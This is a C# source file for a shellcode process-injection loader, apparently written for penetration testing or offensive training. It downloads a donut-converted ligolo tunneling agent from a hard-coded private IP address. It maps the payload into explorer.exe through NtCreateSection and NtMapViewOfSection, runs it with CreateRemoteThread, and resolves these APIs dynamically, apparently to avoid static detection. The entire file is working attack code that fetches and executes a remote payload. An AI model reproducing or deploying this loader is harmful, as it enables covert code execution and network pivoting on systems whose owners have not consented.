using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace Ligolo_Shellcode_Process_Injection
{
    class Program
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr LoadLibraryA(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        private delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, uint processId);
        private delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        private delegate IntPtr GetCurrentProcessDelegate();

        private delegate UInt32 NtCreateSectionDelegate(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);

        private delegate UInt32 NtMapViewOfSectionDelegate(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        private delegate uint NtUnmapViewOfSectionDelegate(IntPtr hProc, IntPtr baseAddr);
        private delegate int NtCloseDelegate(IntPtr hObject);

        static int Main(string[] args)
        {
            IntPtr hKernel32 = LoadLibraryA("kernel32.dll");
            IntPtr ntdllHandle = LoadLibraryA("ntdll.dll");

            IntPtr pOpenProcess = GetProcAddress(hKernel32, "OpenProcess");
            IntPtr pCreateRemoteThread = GetProcAddress(hKernel32, "CreateRemoteThread");
            IntPtr pGetCurrentProcess = GetProcAddress(hKernel32, "GetCurrentProcess");

            IntPtr pNtCreateSection = GetProcAddress(ntdllHandle, "NtCreateSection");
            IntPtr pNtMapViewOfSection = GetProcAddress(ntdllHandle, "NtMapViewOfSection");
            IntPtr pNtUnmapViewOfSection = GetProcAddress(ntdllHandle, "NtUnmapViewOfSection");
            IntPtr pNtClose = GetProcAddress(ntdllHandle, "NtClose");

            OpenProcessDelegate OpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(pOpenProcess, typeof(OpenProcessDelegate));
            CreateRemoteThreadDelegate CreateRemoteThread = (CreateRemoteThreadDelegate)Marshal.GetDelegateForFunctionPointer(pCreateRemoteThread, typeof(CreateRemoteThreadDelegate));
            GetCurrentProcessDelegate GetCurrentProcess = (GetCurrentProcessDelegate)Marshal.GetDelegateForFunctionPointer(pGetCurrentProcess, typeof(GetCurrentProcessDelegate));

            NtCreateSectionDelegate NtCreateSection = (NtCreateSectionDelegate)Marshal.GetDelegateForFunctionPointer(pNtCreateSection, typeof(NtCreateSectionDelegate));
            NtMapViewOfSectionDelegate NtMapViewOfSection = (NtMapViewOfSectionDelegate)Marshal.GetDelegateForFunctionPointer(pNtMapViewOfSection, typeof(NtMapViewOfSectionDelegate));
            NtUnmapViewOfSectionDelegate NtUnmapViewOfSection = (NtUnmapViewOfSectionDelegate)Marshal.GetDelegateForFunctionPointer(pNtUnmapViewOfSection, typeof(NtUnmapViewOfSectionDelegate));
            NtCloseDelegate NtClose = (NtCloseDelegate)Marshal.GetDelegateForFunctionPointer(pNtClose, typeof(NtCloseDelegate));

            // Ligolo donut shellcode
            // donut - a 2 - f 1 - o agent.bin - i agent.exe
            string url = "http://192.168.45.177/ligolo/agent.bin";
            WebClient client = new WebClient();
            byte[] buf = client.DownloadData(url);
            
            long buffer_size = buf.Length;

            IntPtr ptr_section_handle = IntPtr.Zero;
            UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);

            long local_section_offset = 0;
            IntPtr ptr_local_section_addr = IntPtr.Zero;
            UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);

            Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);
            var process = Process.GetProcessesByName("explorer")[0];
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, (uint)process.Id);
            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

            NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
            NtClose(ptr_section_handle);

            CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
            return 0;
        }
    }
}
